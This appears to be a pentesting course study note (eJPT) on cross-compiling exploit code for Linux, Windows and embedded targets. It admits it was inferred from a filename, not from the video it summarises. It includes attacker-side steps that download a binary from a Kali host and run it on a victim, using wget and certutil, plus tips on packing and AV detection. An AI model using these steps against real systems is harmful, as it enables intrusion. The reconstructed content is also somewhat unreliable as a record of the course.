# 04 - Cross-Compiling Exploits

Note: No transcript was provided. The following is a conservative, eJPT-aligned summary inferred from the filename and module context (02-FixingExploits), focused on practical steps you can copy and use on Kali Linux.

## What the video covers (Introduction / big picture)
- When and why to cross-compile exploit code:
  - Target has no compiler/build tools.
  - Architecture or OS mismatch (e.g., compile on Kali for Windows, or 64-bit to 32-bit).
  - Library/glibc mismatch; using static builds to avoid “not found”/ld-linux errors.
  - Embedded/IoT targets (ARM/MIPS) needing specific toolchains.
- Setting up cross-compilers on Kali and fixing common compile/linker errors.
- Producing smaller, portable binaries and verifying architecture before delivery.

## Flow (ordered)
1. Identify target OS/architecture and constraints (32/64-bit, Windows vs Linux, embedded).
2. Choose the right toolchain (gcc/musl-gcc/mingw-w64/arm/mips).
3. Install required build packages and libraries on Kali.
4. Adjust exploit source code if needed (headers, macros, libs).
5. Compile with the correct compiler/flags for the target.
6. Verify the resulting binary (file/ldd/readelf) and strip/compress if desired.
7. Transfer to target and test; iterate on errors (missing libs, wrong arch).
8. Keep a minimal cheat sheet and a troubleshooting checklist.

## Tools highlighted
- Compilers/toolchains:
  - gcc, g++, musl-gcc (static Linux builds)
  - mingw-w64: i686-w64-mingw32-gcc, x86_64-w64-mingw32-gcc (Windows)
  - Cross-gcc for embedded: aarch64/arm/mips/mipsel-linux-gnu-gcc
- Build helpers: make, pkg-config
- Libs/headers: libssl-dev, libc6-dev-i386, gcc-multilib, g++-multilib
- Binary utilities: file, ldd, readelf, strip, upx
- Transfer: python3 -m http.server, curl, wget, scp, smbclient, certutil.exe

## Typical command walkthrough (detailed, copy-paste friendly)

### 0) Prep: install toolchains (Kali/Debian)
```bash
sudo apt update
sudo apt install -y build-essential pkg-config \
  gcc-multilib g++-multilib libc6-dev-i386 \
  mingw-w64 \
  musl-tools \
  libssl-dev \
  gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf \
  gcc-mips-linux-gnu gcc-mipsel-linux-gnu \
  upx-ucl
```

Verify compilers:
```bash
which gcc musl-gcc i686-w64-mingw32-gcc x86_64-w64-mingw32-gcc
```

### 1) Quick target triage (on target if you can)
Linux:
```bash
uname -a
cat /etc/os-release
file /bin/sh
```
Windows:
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
wmic os get osarchitecture
```

### 2) Compile for Linux x86_64 (static where possible)
```bash
# Basic dynamic build (smaller)
gcc exploit.c -O2 -o exploit

# Static glibc build (portable, larger)
gcc exploit.c -O2 -static -s -o exploit_static

# If you hit glibc issues, build with musl for better portability
musl-gcc exploit.c -Os -static -s -o exploit_musl

# Some old exploits dislike PIE; disable if you see "relocation against `...`" errors
gcc exploit.c -O2 -fno-pie -no-pie -o exploit_nopie
```

If the exploit needs OpenSSL (common for TLS/crypto):
```bash
gcc exploit.c -O2 -o exploit -lssl -lcrypto
# Or static with musl (portable)
musl-gcc exploit.c -Os -static -s -o exploit_musl -lssl -lcrypto
```

### 3) Compile for Linux i386 (32-bit) on a 64-bit host
```bash
# Ensure 32-bit multilib and headers were installed
gcc -m32 exploit.c -O2 -o exploit32
# Static 32-bit (often needed for old targets)
gcc -m32 exploit.c -Os -static -s -o exploit32_static
```
If you see “fatal error: bits/predefs.h: No such file or directory” or missing 32-bit libc, ensure:
- gcc-multilib, g++-multilib, libc6-dev-i386 are installed.

### 4) Cross-compile for Windows with mingw-w64
```bash
# 64-bit Windows
x86_64-w64-mingw32-gcc exploit.c -O2 -s -o exploit64.exe -lws2_32 -lwininet -ladvapi32 -static

# 32-bit Windows
i686-w64-mingw32-gcc exploit.c -O2 -s -o exploit32.exe -lws2_32 -lwininet -ladvapi32 -static
```
Notes:
- Winsock networking requires -lws2_32. For very old code you might add -lwsock32.
- If the code uses Windows crypto/registry/services APIs, keep -ladvapi32; HTTP functions may need -lwininet.
- If you get unresolved symbols, check headers and add or remove libs accordingly.

### 5) Cross-compile for embedded (ARM/MIPS)
```bash
# ARMv7 hard-float (common on routers/IoT)
arm-linux-gnueabihf-gcc exploit.c -Os -static -s -o exploit_armhf

# AArch64
aarch64-linux-gnu-gcc exploit.c -Os -static -s -o exploit_aarch64

# MIPS and MIPS little-endian
mips-linux-gnu-gcc exploit.c -Os -static -s -o exploit_mips
mipsel-linux-gnu-gcc exploit.c -Os -static -s -o exploit_mipsel
```
Tips:
- Static is often required on BusyBox systems with limited/odd libc.
- Reduce size further:
```bash
arm-linux-gnueabihf-gcc exploit.c -Os -fdata-sections -ffunction-sections \
  -Wl,--gc-sections -static -s -o exploit_armhf
```

### 6) Define values at compile time (avoid editing source)
If the exploit supports macros for RHOST/RPORT/PATH, pass them with -D:
```bash
gcc exploit.c -O2 -o exploit \
  -DRHOST="\"10.10.14.6\"" -DRPORT=4444 \
  -DUSER="\"www-data\"" -DPATH="\"/tmp/pwn\""
```

### 7) Verify and minimize
```bash
file exploit*            # Check architecture/OS
ldd exploit              # See dynamic deps (won’t work on static)
readelf -l exploit       # Check interpreter / dynamic linker
strip -s exploit         # Remove symbols to shrink
upx -9 exploit           # Compress (avoid if AV is a concern)
```

### 8) Transfer to target
Linux:
```bash
# Serve from Kali
python3 -m http.server 8000
# On target
wget http://<KALI_IP>:8000/exploit
chmod +x exploit
./exploit
```
Windows:
```cmd
# From victim (pull)
certutil -urlcache -split -f http://<KALI_IP>:8000/exploit64.exe exploit.exe
exploit.exe
```
Or use smbclient/scp as appropriate.

### 9) Common compile/linker errors and quick fixes
- undefined reference to ‘SHA1’ / OpenSSL symbols:
```bash
# Order matters on some systems: place libs after source/objects
gcc exploit.c -O2 -o exploit -lssl -lcrypto
```
- cannot find -lssl / headers missing:
```bash
sudo apt install -y libssl-dev
```
- undefined reference to WSAStartup / send / socket on Windows:
```bash
# Add ws2_32 and ensure winsock2.h is included before windows.h
... -lws2_32
```
- relocation errors about PIE:
```bash
gcc exploit.c -fno-pie -no-pie -o exploit
```
- “No such file or directory” on execution even when the file exists:
  - Wrong arch (use file).
  - Dynamic loader missing (prefer -static or musl-gcc).
- Exec format error:
  - Compiled for wrong architecture/endianness.

## Practical tips
- Always verify the target’s architecture before compiling; don’t guess.
- Prefer static builds for portability on old or minimal systems; accept larger size.
- For Windows networking code, link -lws2_32; for HTTP APIs, add -lwininet; for registry/service APIs, -ladvapi32.
- Keep both 32-bit and 64-bit Windows builds; older victims might need 32-bit.
- Use musl-gcc for Linux when glibc versions differ between your box and the target.
- If an exploit won’t compile cleanly, isolate minimal functionality (e.g., the trigger) and rebuild around it, linking required libs explicitly.
- Strip release binaries; keep an unstripped copy for debugging.
- Don’t rely on upx in environments with AV; it may trigger detections.

## Minimal cheat sheet (one-screen flow)
```bash
# Install toolchains
sudo apt update
sudo apt install -y build-essential gcc-multilib g++-multilib libc6-dev-i386 \
  mingw-w64 musl-tools libssl-dev \
  gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf gcc-mips-linux-gnu gcc-mipsel-linux-gnu

# Linux x64 (static portable)
gcc exploit.c -O2 -static -s -o exploit_static
# Or with musl for better portability
musl-gcc exploit.c -Os -static -s -o exploit_musl

# Linux x86 (32-bit)
gcc -m32 exploit.c -O2 -o exploit32
gcc -m32 exploit.c -Os -static -s -o exploit32_static

# Windows (mingw-w64)
x86_64-w64-mingw32-gcc exploit.c -O2 -s -o exploit64.exe -lws2_32 -lwininet -ladvapi32 -static
i686-w64-mingw32-gcc  exploit.c -O2 -s -o exploit32.exe -lws2_32 -lwininet -ladvapi32 -static

# Embedded
arm-linux-gnueabihf-gcc exploit.c -Os -static -s -o exploit_armhf
mipsel-linux-gnu-gcc   exploit.c -Os -static -s -o exploit_mipsel

# Verify / ship
file exploit*
strip -s exploit*
python3 -m http.server 8000
```

## Summary
This video focuses on cross-compiling exploits so you can build working binaries for the victim’s OS/architecture from your attacker box. The core workflow is to identify the target platform, pick the right toolchain, install needed headers/libs, compile with appropriate flags (often statically), verify the binary’s architecture and dependencies, and then transfer and run it on the target. Knowing the right compilers (gcc, musl-gcc, mingw-w64 variants) and common linker flags (-lws2_32, -lssl -lcrypto, -static, -m32, -no-pie) lets you quickly turn public exploit code into reliably running payloads in real engagements.